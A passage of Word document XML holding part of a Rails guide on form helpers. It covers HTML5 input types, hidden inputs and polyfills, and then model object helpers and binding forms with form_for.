              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="user[born_on]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="date"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3E6BEC8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id="user_homepage"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="user[homepage]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="url"</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4D5DDBB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id="user_address"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="user[address]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="email"</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1034627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Hidden inputs are not shown to the user but instead hold data like any textual input. Values inside them can be changed with JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B24D6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search, telephone, date, URL, and email inputs are HTML5 controls. If you require your app to have a consistent experience in older browsers, you will need an HTML5 polyfill (provided by CSS and/or JavaScript). There is definitely </w:t>
      </w:r>
      <w:hyperlink r:id="rId299" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>no shortage of solutions for this</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, although a couple of popular tools at the moment are </w:t>
      </w:r>
      <w:hyperlink r:id="rId300" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Modernizr</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId301" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>yepnope</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which provide a simple way to add functionality based on the presence of detected HTML5 features.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0750C1B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If you’re using password input fields (for any purpose), you might want to configure your application to prevent those parameters from being logged. You can learn about this in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId302" w:anchor="logging" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Security Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402433AA"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2 Dealing with Model Objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DEE4B6"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2.1 Model Object Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF8FFC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 particularly common task for a form is editing or creating a model object. While the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>*_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helpers can certainly be used for this task they are somewhat verbose as for each tag you would have to ensure the correct parameter name is used and set the default value of the input appropriately. Rails provides helpers tailored to this task. These helpers lack the _tag suffix, for example </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_area</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0779FB3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For these helpers the first argument is the name of an instance variable and the second is the name of a method (usually an attribute) to call on that object. Rails will set the value of the input control to the return value of that method for the object and set an appropriate input name. If your controller has defined </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@person</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and that person’s name is Henry then a form containing:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6DA9E76C" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DA853F6" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="688725789"/>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text_field(:person, :name) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A1FF92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will produce output similar to</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4401373A" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27A6C5DB" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2069375683"/>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id="person_name"</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name="person[name]"</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value="Henry"/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7DB08FA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Upon form submission the value entered by the user will be stored in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:person][:name]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:person]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hash is suitable for passing to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Person.new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or, if </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@person</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an instance of Person, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@person.update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. While the name of an attribute is the most common second parameter to these helpers this is not compulsory. In the example above, as long as person objects have a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name=</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> method Rails will be happy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7983BC8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You must pass the name of an instance variable, i.e. </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:person</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"person"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, not an actual instance of your model object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE37B9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provides helpers for displaying the validation errors associated with a model object. These are covered in detail by the </w:t>
      </w:r>
      <w:hyperlink r:id="rId303" w:anchor="displaying-validation-errors-in-the-view" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Record Validations and Callbacks</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B099B96"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2.2 Binding a Form to an Object</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA29EC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While this is an increase in comfort it is far from perfect. If Person has many attributes to edit then we would be repeating the name of the edited object many times. What we want to do is somehow bind a form to a model object, which is exactly what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does.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB16D7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Assume we have a controller for dealing with articles </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/articles_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1E47A568" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20C0504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def</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CD4B7E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@article</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Article.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="579F889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3DA1422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corresponding view </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/articles/new.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> using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looks like this:</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0E52890F" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E729A1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form_for @article, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}, :html</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:class</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "nifty_form"} do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D8D733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f.text_field :title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7689D45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f.text_area :body, :size</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "60x12"</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20A3821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f.submit "Create"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3BC1A13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0F60C24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There are a few things to note here:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E097EED" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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@article</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the actual object being edited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5703DF" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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There is a single hash of options. Routing options are passed in the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:url</w:t>
      </w:r>
